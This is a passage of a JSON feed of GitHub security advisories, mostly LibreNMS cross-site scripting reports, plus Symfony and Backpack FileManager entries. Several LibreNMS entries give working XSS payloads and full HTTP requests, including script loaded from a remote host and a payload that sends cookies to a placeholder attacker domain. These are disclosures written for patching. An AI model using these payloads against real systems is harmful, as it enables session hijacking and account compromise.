            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Reflected Cross-Site Scripting (XSS) vulnerability in the \"section\" parameter of the \"logs\" tab of a device allows attackers to inject arbitrary JavaScript. This vulnerability results in the execution of malicious code when a user accesses the page with a malicious \"section\" parameter, potentially compromising their session and enabling unauthorized actions. The issue arises from a lack of sanitization in the \"report_this()\" function.</p>\n<h3 id=\"details\">Details</h3>\n<p>The \"section\" parameter of the \"logs\" tab is vulnerable to reflected XSS. An attacker can inject the following XSS payload into the \"section\" parameter:\n<code>&lt;script&gt;constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();&lt;%2fscript&gt;</code></p>\n<p>When the page is loaded with this malicious parameter, the script executes immediately. This vulnerability occurs due to the lack of sanitization in the \"report_this()\" function. Other endpoints using this same function may also be vulnerable.</p>\n<p>The vulnerable sink is located here:\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/functions.php#L523\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/functions.php#L523</a>\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/logs.inc.php#L93\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/logs.inc.php#L93</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Inject the following payload into the \"section\" parameter of the \"logs\" tab:</li>\n</ol>\n<p><code>&lt;script&gt;constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();&lt;%2fscript&gt;</code>\n2. Access the page with the injected payload.\n3. Observe that the injected script executes when the page is loaded.</p>\n<p>Example URL: <code>http://&lt;your_url&gt;/device/device=1/tab=logs/section=%3Cscript%3Econstructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();%3C%2fscript%3E/</code></p>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">GET /device/device=1/tab=logs/section=%3Cscript%3Econstructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();%3C%2fscript%3E/ HTTP/1.1\nHost: &lt;your_host&gt;\nCookie: &lt;your_cookie&gt;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows attackers to execute arbitrary JavaScript in the context of a user’s session by crafting a malicious URL. The attack could lead to session hijacking, unauthorized actions, or further exploitation by injecting malicious scripts.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-v7w9-63xh-6r3w\">https://github.com/librenms/librenms/security/advisories/GHSA-v7w9-63xh-6r3w</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/6a14a9bd767c6e452e4df77a24126c3eeb93dcbf\">https://github.com/librenms/librenms/commit/6a14a9bd767c6e452e4df77a24126c3eeb93dcbf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v7w9-63xh-6r3w\">https://github.com/advisories/GHSA-v7w9-63xh-6r3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v7w9-63xh-6r3w",
            "title": "[librenms/librenms] LibreNMS has a Reflected XSS ('Cross-site Scripting') in librenms/includes/functions.php",
            "date_modified": "2024-11-15T15:34:38.000Z",
            "date_published": "2024-11-15T15:34:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v7w9-63xh-6r3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the \"Port Settings\" page allows authenticated users to inject arbitrary JavaScript through the \"name\" parameter when creating a new Port Group. This vulnerability results in the execution of malicious code when the \"Port Settings\" page is visited after the affected Port Group is added to a device, potentially compromising user sessions and allowing unauthorized actions.</p>\n<h3 id=\"details\">Details</h3>\n<p>When creating a new \"Port Group,\" an attacker can inject the following XSS payload into the \"name\" parameter:\n<code>&lt;script/src=//15.rs&gt;&lt;/script&gt;</code></p>\n<p>Note: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>\n<p>The payload triggers when the affected Port Group is added to a device and the \"Port Settings\" page is reloaded. The vulnerability is due to insufficient sanitization of the \"name\" parameter. The sink responsible for this issue is:\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L69\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L69</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a new Port Group using the following payload in the \"name\" parameter:</li>\n</ol>\n<p><code>name&lt;script/src=//15.rs&gt;&lt;/script&gt;</code>\n2. Add the Port Group to a device's port settings.\n3. Reload the \"Port Settings\" page.\n4. Observe that the injected script executes.</p>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">POST /port-groups HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded\nCookie: &lt;your_cookie&gt;\n\n_token=&lt;your_token&gt;&amp;name=name&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;desc=descr&lt;script/src=//15.rs&gt;&lt;/script&gt;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the \"Port Settings\" page of a device. This could result in the compromise of user accounts and unauthorized actions performed on their behalf.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-xh4g-c9p6-5jxg\">https://github.com/librenms/librenms/security/advisories/GHSA-xh4g-c9p6-5jxg</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/82a744bfe29017b8b58b5752ab9e1b335bedf0a0\">https://github.com/librenms/librenms/commit/82a744bfe29017b8b58b5752ab9e1b335bedf0a0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xh4g-c9p6-5jxg\">https://github.com/advisories/GHSA-xh4g-c9p6-5jxg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xh4g-c9p6-5jxg",
            "title": "[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/app/Http/Controllers/Table/EditPortsController.php",
            "date_modified": "2024-11-15T15:30:06.000Z",
            "date_published": "2024-11-15T15:30:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xh4g-c9p6-5jxg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the \"Capture Debug Information\" page allows authenticated users to inject arbitrary JavaScript through the \"hostname\" parameter when creating a new device. This vulnerability results in the execution of malicious code when the \"Capture Debug Information\" page is visited, redirecting the user and sending non-httponly cookies to an attacker-controlled domain.</p>\n<h3 id=\"details\">Details</h3>\n<p>When creating a new device, an attacker can inject the following XSS payload into the \"hostname\" parameter:</p>\n<pre><code>test'\" autofocus onfocus=\"document.location='https://&lt;attacker_domain&gt;/logger.php?c='+document.cookie\"\n</code></pre>\n<p>(Note: You may need to URL-encode the '+' sign in the payload.)</p>\n<p>The payload triggers automatically when visiting the \"Capture Debug Information\" page for the device, redirecting the user's browser to the attacker-controlled domain along with any non-httponly cookies.</p>\n<p>The vulnerability is due to insufficient sanitization of the \"url\" variable before it is output in the HTML. This is evident in the following lines of code:</p>\n<p><a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/capture.inc.php#L55\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/capture.inc.php#L55</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a new device with the following payload in the \"hostname\" parameter:</li>\n</ol>\n<pre><code>test'\" autofocus onfocus=\"document.location='https://&lt;attacker_domain&gt;/logger.php?c='+document.cookie\"\n</code></pre>\n<ol start=\"2\">\n<li>Save the device.</li>\n<li>Navigate to the \"Capture Debug Information\" page for the device.</li>\n<li>Observe that the injected script triggers and redirects the user to the attacker's domain, sending cookies.</li>\n</ol>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">POST /addhost HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded\nCookie: &lt;your_cookie&gt;\n\n_token=&lt;your_token&gt;&amp;hostname=test%27%22+autofocus+onfocus%3D%22document.location%3D%27https%3A%2F%2F&lt;attacker_domain&gt;%2Flogger.php%3Fc%3D%27%2bdocument.cookie%22&amp;snmp=on&amp;sysName=&amp;hardware=&amp;os=&amp;os_id=&amp;snmpver=v2c&amp;port=&amp;transport=udp&amp;port_assoc_mode=ifIndex&amp;community=&amp;authlevel=noAuthNoPriv&amp;authname=&amp;authpass=&amp;authalgo=SHA&amp;cryptopass=&amp;cryptoalgo=AES&amp;force_add=on&amp;Submit=\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the \"Capture Debug Information\" page of the device. The attacker can redirect the user to a malicious domain and capture non-httponly cookies, potentially compromising the user's account and allowing unauthorized actions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68\">https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6\">https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rmr4-x6c9-jc68\">https://github.com/advisories/GHSA-rmr4-x6c9-jc68</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rmr4-x6c9-jc68",
            "title": "[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/capture.inc.php",
            "date_modified": "2024-11-15T15:28:26.000Z",
            "date_published": "2024-11-15T15:27:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rmr4-x6c9-jc68"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the \"Manage User Access\" page allows authenticated users to inject arbitrary JavaScript through the \"bill_name\" parameter when creating a new bill. This vulnerability can lead to the execution of malicious code when visiting the \"Bill Access\" dropdown in the user's \"Manage Access\" page, potentially compromising user sessions and allowing unauthorized actions.</p>\n<h3 id=\"details\">Details</h3>\n<p>When creating a new bill, an attacker can inject the following XSS payload into the \"bill_name\" parameter:\n<code>test1'\"&gt;&lt;script/src=//15.rs&gt;</code></p>\n<p>Note: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>\n<p>The payload triggers in the \"Bill Access\" dropdown when the user's \"Manage Access\" page is visited. The sink responsible for this issue is:\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/edituser.inc.php#L309\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/edituser.inc.php#L309</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a new bill using the following payload in the \"bill_name\" parameter:</li>\n</ol>\n<p><code>test1'\"&gt;&lt;script/src=//15.rs&gt;</code>\n2. Save the bill.\n3. Navigate to the \"Manage Access\" page for the user.\n4. Observe that the injected script executes in the \"Bill Access\" dropdown.</p>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">POST /bill/bill_id=2/view=edit/ HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded\nCookie: &lt;your_cookie&gt;\n\n_token=&lt;your_token&gt;&amp;action=update_bill&amp;bill_name=test1%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;bill_type=cdr&amp;bill_cdr=&amp;bill_cdr_type=Kbps&amp;dir_95th=in&amp;bill_quota=&amp;bill_quota_type=MB&amp;bill_day=1&amp;bill_custid=test2%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;bill_ref=test3%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;bill_notes=test4%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;Submit=Save\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the \"Manage Access\" page. The attacker can perform unauthorized actions or compromise user accounts by exploiting this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58\">https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0\">https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-888j-pjqh-fx58\">https://github.com/advisories/GHSA-888j-pjqh-fx58</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-888j-pjqh-fx58",
            "title": "[librenms/librenms] Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/edituser.inc.php",
            "date_modified": "2024-11-15T15:25:57.000Z",
            "date_published": "2024-11-15T15:25:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-888j-pjqh-fx58"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The application fail to sanitising inputs properly and rendering the code from user input to browser which allow an attacker to execute malicious javascript code.</p>\n<h3 id=\"details\">Details</h3>\n<p>User with Admin role can add Notes to a device, the application did not properly sanitize the user input, when the ExamplePlugin enable, if java script code is inside the device's Notes, its will be trigger.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>As an admin user, enable the ExamplePlugin.</li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/409f3a0c-7fac-46e3-8140-84749a120dd9\"></p>\n<ol start=\"2\">\n<li>Add the payload <code>&lt;img src=\"x\" onerror=\"alert(document.cookie)\"&gt;</code> into the device Notes</li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/c2a57dbd-ea07-4166-8b29-61be6ad6c2b6\"></p>\n<ol start=\"3\">\n<li>Once visit the Overview of the Device, a pop-up will show up.</li>\n</ol>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/3c9b87c3-d010-49e7-bd13-4a715db4e0c3\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions.\nImpacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-c86q-rj37-8f85\">https://github.com/librenms/librenms/security/advisories/GHSA-c86q-rj37-8f85</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/24b142d753898e273ec20b542a27dd6eb530c7d8\">https://github.com/librenms/librenms/commit/24b142d753898e273ec20b542a27dd6eb530c7d8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c86q-rj37-8f85\">https://github.com/advisories/GHSA-c86q-rj37-8f85</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c86q-rj37-8f85",
            "title": "[librenms/librenms] LibreNMS has a stored XSS in ExamplePlugin with Device's Notes",
            "date_modified": "2024-11-15T15:17:36.000Z",
            "date_published": "2024-11-15T15:17:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c86q-rj37-8f85"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the API-Access page allows authenticated users to inject arbitrary JavaScript through the \"token\" parameter when creating a new API token. This vulnerability can result in the execution of malicious code in the context of other users' sessions, compromising their accounts and enabling unauthorized actions.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability occurs when creating a new API Token. An attacker can inject arbitrary JavaScript into the \"token\" parameter, which is then executed when the API Access page is visited. The payload is triggered twice—once in the \"Token Hash\" column and once in the \"QR Code\" column.</p>\n<p>The payload used to exploit this vulnerability is: <code>'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code></p>\n<p>Note: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>\n<p>The vulnerability is due to insufficient sanitization of the \"token_hash\" variable before it is output in the HTML. This is evident in the following lines of code:</p>\n<p><a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L152\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L152</a>\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L153\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L153</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a new API token with the following payload in the \"token\" parameter: <code>'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code></li>\n<li>Save the token.</li>\n<li>Navigate to the API Access page.</li>\n<li>Observe that the injected script executes twice, once in the \"Token Hash\" column and once in the \"QR Code\" column.</li>\n</ol>\n<pre><code class=\"language-http\">POST /ajax_form.php HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CSRF-TOKEN: &lt;your_token&gt;\nX-Requested-With: XMLHttpRequest\nCookie: &lt;your_cookie&gt;\n\n_token=&lt;your_token&gt;&amp;user_id=1&amp;token='\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;description=t'\"&gt;&lt;script/src=//15.rs&gt;&amp;type=token-item-create\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability allows authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. This can lead to account compromise and enable unauthorized actions on behalf of the impacted users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-gfwr-xqmj-j27v\">https://github.com/librenms/librenms/security/advisories/GHSA-gfwr-xqmj-j27v</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/25988a937cbaebd2ba4c0517510206c404dfb359\">https://github.com/librenms/librenms/commit/25988a937cbaebd2ba4c0517510206c404dfb359</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gfwr-xqmj-j27v\">https://github.com/advisories/GHSA-gfwr-xqmj-j27v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gfwr-xqmj-j27v",
            "title": "[librenms/librenms] LibreNMS has a stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/api-access.inc.php",
            "date_modified": "2024-11-15T15:11:46.000Z",
            "date_published": "2024-11-15T15:11:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gfwr-xqmj-j27v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"description\">Description</h3>\n<p>When using the <code>NoPrivateNetworkHttpClient</code>, some internal information is still leaking during host resolution, which leads to possible IP/port enumeration.</p>\n<h3 id=\"resolution\">Resolution</h3>\n<p>The <code>NoPrivateNetworkHttpClient</code> now filters blocked IPs earlier to prevent such leaks.</p>\n<p>The fisrt patch for this issue is available <a href=\"https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b\">here</a> for branch 5.4.</p>\n<p>The second one is available <a href=\"https://github.com/symfony/symfony/commit/b4bf5afdbdcb2fd03da513ee03beeabeb551e5fa\">here</a> for branch 5.4 also.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>We would like to thank Linus Karlsson and Chris Smith for reporting the issue and Nicolas Grekas for providing the fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm\">https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm</a></li>\n<li><a href=\"https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b\">https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml</a></li>\n<li><a href=\"https://symfony.com/cve-2024-50342\">https://symfony.com/cve-2024-50342</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50342\">https://nvd.nist.gov/vuln/detail/CVE-2024-50342</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9c3x-r3wp-mgxm\">https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9c3x-r3wp-mgxm",
            "title": "[symfony/symfony] Symfony allows internal address and port enumeration by NoPrivateNetworkHttpClient",
            "date_modified": "2024-11-13T18:51:05.000Z",
            "date_published": "2024-11-06T15:16:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9c3x-r3wp-mgxm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"description\">Description</h3>\n<p>When using the <code>NoPrivateNetworkHttpClient</code>, some internal information is still leaking during host resolution, which leads to possible IP/port enumeration.</p>\n<h3 id=\"resolution\">Resolution</h3>\n<p>The <code>NoPrivateNetworkHttpClient</code> now filters blocked IPs earlier to prevent such leaks.</p>\n<p>The fisrt patch for this issue is available <a href=\"https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b\">here</a> for branch 5.4.</p>\n<p>The second one is available <a href=\"https://github.com/symfony/symfony/commit/b4bf5afdbdcb2fd03da513ee03beeabeb551e5fa\">here</a> for branch 5.4 also.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>We would like to thank Linus Karlsson and Chris Smith for reporting the issue and Nicolas Grekas for providing the fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm\">https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm</a></li>\n<li><a href=\"https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b\">https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml</a></li>\n<li><a href=\"https://symfony.com/cve-2024-50342\">https://symfony.com/cve-2024-50342</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50342\">https://nvd.nist.gov/vuln/detail/CVE-2024-50342</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9c3x-r3wp-mgxm\">https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9c3x-r3wp-mgxm",
            "title": "[symfony/symfony] Symfony allows internal address and port enumeration by NoPrivateNetworkHttpClient",
            "date_modified": "2024-11-13T18:51:05.000Z",
            "date_published": "2024-11-06T15:16:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9c3x-r3wp-mgxm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"description\">Description</h3>\n<p>When using the <code>NoPrivateNetworkHttpClient</code>, some internal information is still leaking during host resolution, which leads to possible IP/port enumeration.</p>\n<h3 id=\"resolution\">Resolution</h3>\n<p>The <code>NoPrivateNetworkHttpClient</code> now filters blocked IPs earlier to prevent such leaks.</p>\n<p>The fisrt patch for this issue is available <a href=\"https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b\">here</a> for branch 5.4.</p>\n<p>The second one is available <a href=\"https://github.com/symfony/symfony/commit/b4bf5afdbdcb2fd03da513ee03beeabeb551e5fa\">here</a> for branch 5.4 also.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>We would like to thank Linus Karlsson and Chris Smith for reporting the issue and Nicolas Grekas for providing the fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm\">https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm</a></li>\n<li><a href=\"https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b\">https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml</a></li>\n<li><a href=\"https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml\">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml</a></li>\n<li><a href=\"https://symfony.com/cve-2024-50342\">https://symfony.com/cve-2024-50342</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50342\">https://nvd.nist.gov/vuln/detail/CVE-2024-50342</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9c3x-r3wp-mgxm\">https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9c3x-r3wp-mgxm",
            "title": "[symfony/symfony] Symfony allows internal address and port enumeration by NoPrivateNetworkHttpClient",
            "date_modified": "2024-11-13T18:51:05.000Z",
            "date_published": "2024-11-06T15:16:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9c3x-r3wp-mgxm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Deserialization of untrusted data from the <code>mimes</code> parameter could lead to remote code execution.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in 3.0.9</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Not needed, a <code>composer update</code> will solve it in a non-breaking way.</p>\n<h3 id=\"references\">References</h3>\n<p>Reported responsibly Vladislav Gladkiy at <a href=\"https://www.ptsecurity.com/ww-en/\">Positive Technologies</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Laravel-Backpack/FileManager/security/advisories/GHSA-8237-957h-h2c2\">https://github.com/Laravel-Backpack/FileManager/security/advisories/GHSA-8237-957h-h2c2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-52306\">https://nvd.nist.gov/vuln/detail/CVE-2024-52306</a></li>\n<li><a href=\"https://github.com/Laravel-Backpack/FileManager/commit/2830498b85e05fb3c92179053b4d7c4a0fdb880b\">https://github.com/Laravel-Backpack/FileManager/commit/2830498b85e05fb3c92179053b4d7c4a0fdb880b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8237-957h-h2c2\">https://github.com/advisories/GHSA-8237-957h-h2c2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8237-957h-h2c2",
            "title": "[backpack/filemanager] FileManager Deserialization of Untrusted Data vulnerability",
            "date_modified": "2024-11-13T18:43:03.000Z",
            "date_published": "2024-11-13T18:43:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8237-957h-h2c2"
            },
            "tags": [
                "severity"
            ]
        },
        {
